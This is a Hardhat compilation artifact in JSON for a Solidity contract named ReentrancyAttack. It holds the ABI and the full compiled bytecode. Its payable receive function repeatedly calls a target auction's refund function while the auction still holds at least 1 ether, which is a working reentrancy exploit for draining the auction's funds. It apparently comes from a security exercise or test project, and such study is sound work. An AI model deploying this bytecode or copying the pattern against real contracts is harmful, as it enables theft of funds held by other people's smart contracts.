{
  "_format": "hh-sol-artifact-1",
  "contractName": "ReentrancyAttack",
  "sourceName": "contracts/Reentrancy.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_auction",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "currentBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "proxyBid",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610562380380610562833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b61044b806101176000396000f3fe6080604052600436106100385760003560e01c80630aa8c871146101635780639e5faafc1461016d578063ce845d1d146101845761015e565b3661015e57670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ce845d1d6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100b1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100d59190610341565b111561015c5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663590e1ae36040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014357600080fd5b505af1158015610157573d6000803e3d6000fd5b505050505b005b600080fd5b61016b6101af565b005b34801561017957600080fd5b5061018261027c565b005b34801561019057600080fd5b506101996102fe565b6040516101a6919061037d565b60405180910390f35b670de0b6b3a764000034146101f9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101f0906103f5565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631998aeef346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561026157600080fd5b505af1158015610275573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663590e1ae36040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102e457600080fd5b505af11580156102f8573d6000803e3d6000fd5b50505050565b600047905090565b600080fd5b6000819050919050565b61031e8161030b565b811461032957600080fd5b50565b60008151905061033b81610315565b92915050565b60006020828403121561035757610356610306565b5b60006103658482850161032c565b91505092915050565b6103778161030b565b82525050565b6000602082019050610392600083018461036e565b92915050565b600082825260208201905092915050565b7f696e636f72656374000000000000000000000000000000000000000000000000600082015250565b60006103df600883610398565b91506103ea826103a9565b602082019050919050565b6000602082019050818103600083015261040e816103d2565b905091905056fea264697066735822122069b9da4bb4806a6548f23289ae0debe150b8eb2222310bb535f99a369435167964736f6c63430008110033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}